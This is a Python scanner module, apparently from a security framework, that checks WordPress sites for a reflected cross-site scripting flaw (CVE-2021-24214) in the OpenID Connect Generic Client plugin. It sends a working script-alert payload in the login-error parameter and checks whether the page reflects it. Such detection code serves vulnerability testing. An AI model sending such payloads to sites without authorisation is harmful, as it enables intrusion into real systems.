#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""WordPress OpenID Connect Generic Client plugin 3."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'WordPress OpenID Connect Generic Client 3.8.0-3.8.1 - Cross-Site Scripting Detection',
        'description': 'WordPress OpenID Connect Generic Client plugin 3.8.0 and 3.8.1 contains a cross-site scripting vulnerability. It does not sanitize the login error when output back in the login form, thereby not requiring authentication, which can be exploited with the default configuration.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve2021', 'cve', 'wpscan', 'wordpress', 'xss', 'wp-plugin', 'wp', 'openid', 'daggerhartlab', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://wpscan.com/vulnerability/31cf0dfb-4025-4898-a5f4-fc7115565a10',
            'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-24214',
            'https://nvd.nist.gov/vuln/detail/CVE-2021-24214',
            'https://github.com/ARPSyndicate/cvemon',
            'https://github.com/ARPSyndicate/kenzer-templates',
        ],
        'cve': 'CVE-2021-24214',
    }

    def run(self):
        path = '/wp-content/plugins/daggerhart-openid-connect-generic/readme.txt'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('OpenID Connect Generic Client',)
        if not (any(m in body for m in body_any)):
            return False
        path = '/wp-login.php?login-error=<script>alert(document.domain)</script>'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('ERROR (<script>alert(document.domain)</script>):', 'Login with OpenID Connect',)
        header_any = ('text/html',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)):
            self.set_info(severity='medium', reason='WordPress OpenID Connect Generic Client 3.8.0-3.8.1 - Cross-Site Scripting detected', path=path)
            return True
        return False

